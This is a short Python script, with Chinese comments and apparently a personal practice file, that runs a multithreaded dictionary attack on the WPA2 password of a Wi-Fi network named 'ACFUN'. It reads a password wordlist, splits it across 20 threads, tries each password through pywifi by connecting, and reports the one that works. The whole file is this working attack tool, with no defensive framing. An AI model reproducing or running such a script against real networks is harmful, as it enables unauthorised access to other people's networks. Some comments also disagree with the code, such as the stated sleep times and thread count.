import time
import pywifi
from pywifi import const
import threading
import win32api

class WifiThread(threading.Thread):
	"""自定义一个多线程类,继承自threading.Thread类,目的就是为了调用start()的方法"""
	def __init__(self, passwordlist, istart, iend):
		threading.Thread.__init__(self)
		self.wifi = pywifi.PyWiFi()  # 开启一个无线对象
		self.iface = self.wifi.interfaces()[0]  # 抓取无线网卡列表第一个无线网卡
		self.passwordlist = passwordlist  # 密码列表
		self.istart = istart  # 开始
		self.iend = iend  # 结束

	def run(self):  # 只能命名为run方法,否则会报错
		for i in range(self.istart, self.iend):
			global ispassword  # 状态
			if ispassword:  # 如果跳出循环
				break
			password = self.passwordlist[i][:-1]
			if self.test_wifi_connect(password):
				ispassword = True  # 密码成功
				print(password, " 密码正确")
				win32api.MessageBox(0, password, " 密码正确", 0)
			else:
				print(password, " 密码错误")

	def test_wifi_connect(self, password_str):

		profile = pywifi.Profile()  # 配置文件
		profile.ssid = "ACFUN"  # 就是wifi名称
		profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
		profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
		profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
		profile.key = password_str  # 测试密码成功或者失败


		if True:
			self.iface.remove_all_network_profiles()  # 删除其他所有配置文件
			tmp_profile = self.iface.add_network_profile(profile)  # 加载配置文件

			self.iface.disconnect()  # 断开无线网卡链接
			time.sleep(1)  # 断开以后缓冲3秒
			self.iface.connect(tmp_profile)  # 链接
			time.sleep(3)  # 10秒内看是否可以链接上。
			isOK = False
			if self.iface.status() == const.IFACE_CONNECTED:
				isOK = True
				print("链接成功")
			else:
				print("链接失败")
			self.iface.disconnect()  # 断开连接
			return isOK


ispassword = False
mutex = threading.Lock()
file_path = r"E:\Python练习代码\PythonFile\分类练习\code_破解WiFi\pass1.txt"
file = open(file_path, "r")
passwordlist = file.readlines()
lines = len(passwordlist)
file.close()

N = 20
threadlist = []
for i in range(0, N - 1):  # 0,1,2,3,4,5,6,7,8
	mythd = WifiThread(passwordlist, i * (lines // (N - 1)), (i + 1) * (lines // (N - 1)))
	mythd.start()
	threadlist.append(mythd)  # 加入列表
mylastthd = WifiThread(passwordlist, lines // (N - 1) * (N - 1), lines)  # 查找
mylastthd.start()
threadlist.append(mylastthd)  # 10个线程

for thd in threadlist:
	thd.join()
print("搜索完成")
